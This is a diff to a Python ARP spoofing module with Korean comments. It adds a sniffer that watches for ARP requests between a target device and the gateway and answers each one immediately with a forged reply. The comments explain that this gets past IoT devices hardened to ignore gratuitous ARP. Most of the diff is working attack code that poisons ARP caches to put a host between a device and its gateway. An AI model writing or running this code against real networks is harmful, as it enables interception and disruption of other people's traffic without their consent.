@@ -24,9 +24,18 @@ from typing import Callable
 logger = logging.getLogger("arp_engine")
 
 try:
-    from scapy.all import ARP, Ether, conf, get_if_addr, get_if_hwaddr, send, srp  # type: ignore
+    from scapy.all import (  # type: ignore
+        ARP,
+        AsyncSniffer,
+        Ether,
+        conf,
+        get_if_addr,
+        get_if_hwaddr,
+        send,
+        srp,
+    )
 except ImportError:  # scapy/Npcap 미설치 환경에서도 이 모듈만은 import 가능하게
-    ARP = Ether = conf = None  # type: ignore
+    ARP = Ether = conf = AsyncSniffer = None  # type: ignore
 
     def get_if_hwaddr(*_a, **_k):  # type: ignore
         raise RuntimeError("scapy가 설치되어 있지 않습니다.")
@@ -74,6 +83,7 @@ class ArpSpoofWorker:
         self._thread: threading.Thread | None = None
         self._my_mac: str | None = None
         self._gateway_mac: str | None = None
+        self._sniffer: AsyncSniffer | None = None  # type: ignore[valid-type]
 
     def start(self) -> None:
         if self._thread and self._thread.is_alive():
@@ -87,11 +97,68 @@ class ArpSpoofWorker:
 
     def stop(self, restore: bool = True) -> None:
         self._stop_event.set()
+        self._stop_active_reply_sniffer()
         if self._thread:
             self._thread.join(timeout=5)
         if restore:
             self._restore()
         logger.info("ARP 스푸핑 중단: %s (%s)", self.target.name, self.target.ip)
+
+    def _on_arp_packet(self, packet) -> None:
+        """대상 기기나 게이트웨이가 실제로 ARP 요청을 보내는 순간을 엿듣다가,
+        그 자리에서 바로 답해준다.
+
+        일부 IoT Wi-Fi 모듈은 자기가 요청하지 않은(gratuitous) ARP 응답은
+        무시하도록 하드닝되어 있어서, 2초 주기로 일방적으로 광고만 하는
+        방식으로는 씨알도 안 먹힐 수 있다. "누가 물어보면 즉시 답한다"는
+        이 방식이 정석적인 ARP 스푸핑 구현이고, 하드닝된 기기에도 통한다.
+        """
+        try:
+            if packet.op != 1:  # who-has 요청만 상대한다
+                return
+            if packet.pdst == self.gateway_ip and packet.psrc == self.target.ip:
+                # 대상 기기가 "게이트웨이 어디 있어?" 라고 물어봄 -> 즉시 답한다
+                _send_arp_reply(
+                    dst_ip=self.target.ip,
+                    dst_mac=self.target.mac,
+                    spoofed_src_ip=self.gateway_ip,
+                    src_mac=self._my_mac,
+                )
+                logger.info(
+                    "ARP 요청 실시간 응답 (%s): 기기가 게이트웨이를 물어봐서 즉시 답변",
+                    self.target.name,
+                )
+            elif packet.pdst == self.target.ip and packet.psrc == self.gateway_ip:
+                # 게이트웨이가 "대상 기기 어디 있어?" 라고 물어봄 -> 즉시 답한다
+                _send_arp_reply(
+                    dst_ip=self.gateway_ip,
+                    dst_mac=self._gateway_mac,
+                    spoofed_src_ip=self.target.ip,
+                    src_mac=self._my_mac,
+                )
+        except Exception as e:  # noqa: BLE001
+            logger.warning("ARP 요청 실시간 응답 실패 (%s): %s", self.target.name, e)
+
+    def _start_active_reply_sniffer(self) -> None:
+        if AsyncSniffer is None:
+            return
+        try:
+            self._sniffer = AsyncSniffer(
+                filter="arp", prn=self._on_arp_packet, store=False
+            )
+            self._sniffer.start()
+            logger.info("ARP 요청 실시간 감시 시작: %s", self.target.name)
+        except Exception as e:  # noqa: BLE001
+            logger.warning("ARP 요청 실시간 감시 시작 실패 (%s): %s", self.target.name, e)
+            self._sniffer = None
+
+    def _stop_active_reply_sniffer(self) -> None:
+        if self._sniffer is not None:
+            try:
+                self._sniffer.stop()
+            except Exception:  # noqa: BLE001
+                pass
+            self._sniffer = None
 
     def _resolve_mac(self, ip: str, retries: int = 3) -> str | None:
         for _ in range(retries):
@@ -140,6 +207,8 @@ class ArpSpoofWorker:
             )
         except Exception as e:  # noqa: BLE001
             logger.warning("네트워크 어댑터 정보 확인 실패 (%s): %s", self.target.name, e)
+
+        self._start_active_reply_sniffer()
 
         return True
 
